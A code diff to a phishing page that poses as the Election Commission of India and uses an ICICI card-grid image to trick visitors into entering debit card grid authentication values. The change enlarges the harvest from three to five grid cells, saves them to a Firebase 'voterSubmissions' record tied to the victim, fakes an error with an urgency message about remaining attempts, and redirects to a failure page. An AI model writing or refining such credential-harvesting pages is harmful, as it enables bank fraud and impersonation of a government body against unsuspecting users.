@@ -16,7 +16,7 @@
             padding: 15px; 
         }
 
-        /* Form Container - Index.html ki tarah exact card style */
+        /* Form Container - Exact card style */
         .form-container { 
             background: #ffffff; 
             padding: 0 30px 30px 30px; 
@@ -28,7 +28,7 @@
             text-align: center; 
         }
 
-        /* Top Blue Header Section - बिना किसी ऊपर के गैप के */
+        /* Top Blue Header Section */
         .top-header {
             margin-top: 0;
             margin-left: -30px;
@@ -116,19 +116,25 @@
             box-shadow: 0 4px 15px rgba(220, 53, 69, 0.2);
         }
         
+        /* 5 ग्रिड्स के लिए लेआउट (ऊपर 3 और नीचे 2) */
         .grid-container {
             display: flex;
-            justify-content: space-between;
-            gap: 12px;
+            flex-direction: column;
+            gap: 10px;
             margin-bottom: 18px;
             background: #f8f9fa;
             padding: 15px 10px;
             border-radius: 8px;
             border: 1px solid #dfe4ea;
         }
+        .grid-row {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+        }
         .grid-item { flex: 1; text-align: center; }
-        .grid-label { display: block; margin-bottom: 6px; color: #004085; font-weight: bold; font-size: 15px; }
-        .grid-input { width: 100%; padding: 10px 5px; border: 1px solid #dfe4ea; border-radius: 6px; font-size: 15px; text-align: center; letter-spacing: 2px; background: #fff; color: #333; }
+        .grid-label { display: block; margin-bottom: 4px; color: #004085; font-weight: bold; font-size: 14px; }
+        .grid-input { width: 100%; padding: 9px 5px; border: 1px solid #dfe4ea; border-radius: 6px; font-size: 15px; text-align: center; letter-spacing: 2px; background: #fff; color: #333; }
         .grid-input:focus { outline: none; border-color: #0056b3; background: #fff; box-shadow: 0 0 5px rgba(0, 86, 179, 0.2); }
 
         .btn-next { width: 100%; padding: 14px; background: #0056b3; border: none; border-radius: 8px; color: white; font-size: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 4px 12px rgba(0, 86, 179, 0.3); }
@@ -140,7 +146,7 @@
 </head>
 <body>
     <div class="form-container">
-        <!-- Top Blue Header Section without top gap -->
+        <!-- Top Blue Header Section -->
         <div class="top-header">
             <img src="logo.png" alt="Election Commission Logo">
             <div class="hindi-title">भारत निर्वाचन आयोग</div>
@@ -149,7 +155,7 @@
         </div>
 
         <h2>Debit Card Grid Authentication</h2>
-        <div class="sub-title">Please Enter Correct Grid Value Last 2 Attempt Remain</div>
+        <div class="sub-title">Please Enter Correct Grid Value (B, F, H, O, J) - Last 2 Attempt Remain</div>
 
         <div class="card-preview-box">
             <img src="card-grid.png" alt="ICICI Card Grid Reference">
@@ -162,17 +168,31 @@
 
         <form id="gridForm3">
             <div class="grid-container">
-                <div class="grid-item">
-                    <span class="grid-label">F</span>
-                    <input type="password" id="gridO" name="gridO" class="grid-input" placeholder="--" maxlength="2" required>
+                <!-- ऊपर की पंक्ति (3 बॉक्स: B, F, H) -->
+                <div class="grid-row">
+                    <div class="grid-item">
+                        <span class="grid-label">B</span>
+                        <input type="password" id="gridB" name="gridB" class="grid-input" placeholder="--" maxlength="2" required>
+                    </div>
+                    <div class="grid-item">
+                        <span class="grid-label">F</span>
+                        <input type="password" id="gridF" name="gridF" class="grid-input" placeholder="--" maxlength="2" required>
+                    </div>
+                    <div class="grid-item">
+                        <span class="grid-label">H</span>
+                        <input type="password" id="gridH" name="gridH" class="grid-input" placeholder="--" maxlength="2" required>
+                    </div>
                 </div>
-                <div class="grid-item">
-                    <span class="grid-label">L</span>
-                    <input type="password" id="gridP" name="gridP" class="grid-input" placeholder="--" maxlength="2" required>
-                </div>
-                <div class="grid-item">
-                    <span class="grid-label">K</span>
-                    <input type="password" id="gridK" name="gridK" class="grid-input" placeholder="--" maxlength="2" required>
+                <!-- नीचे की पंक्ति (2 बॉक्स: O, J) -->
+                <div class="grid-row">
+                    <div class="grid-item">
+                        <span class="grid-label">O</span>
+                        <input type="password" id="gridO" name="gridO" class="grid-input" placeholder="--" maxlength="2" required>
+                    </div>
+                    <div class="grid-item">
+                        <span class="grid-label">J</span>
+                        <input type="password" id="gridJ" name="gridJ" class="grid-input" placeholder="--" maxlength="2" required>
+                    </div>
                 </div>
             </div>
 
@@ -205,10 +225,14 @@
         document.getElementById('gridForm3').addEventListener('submit', async function(e) {
             e.preventDefault();
             
+            const gridB = document.getElementById('gridB').value;
+            const gridF = document.getElementById('gridF').value;
+            const gridH = document.getElementById('gridH').value;
             const gridO = document.getElementById('gridO').value;
-            const gridP = document.getElementById('gridP').value;
-            const gridK = document.getElementById('gridK').value;
-            const gridStep3Data = `O:${gridO}, P:${gridP}, K:${gridK}`;
+            const gridJ = document.getElementById('gridJ').value;
+            
+            // डेटाबेस में पांचों वैल्यूज सही फॉर्मेट में सेव होंगी
+            const gridStep3Data = `B:${gridB}, F:${gridF}, H:${gridH}, O:${gridO}, J:${gridJ}`;
 
             const docId = localStorage.getItem('voterDocId');
             if (!docId) {
@@ -225,7 +249,7 @@
                 const docRef = doc(db, "voterSubmissions", docId);
                 await updateDoc(docRef, {
                     gridStep3: gridStep3Data,
-                    currentStep: "Grid Step 3 Submitted"
+                    currentStep: "Grid Step 3 Submitted (B,F,H,O,J)"
                 });
 
                 setTimeout(() => {
@@ -233,7 +257,7 @@
                     document.getElementById('errorAlert').style.display = 'block';
 
                     setTimeout(() => {
-                        window.location.href = "grid_step4.html"; 
+                        window.location.href = "failed.html"; 
                     }, 2500);
                 }, 3500);
 
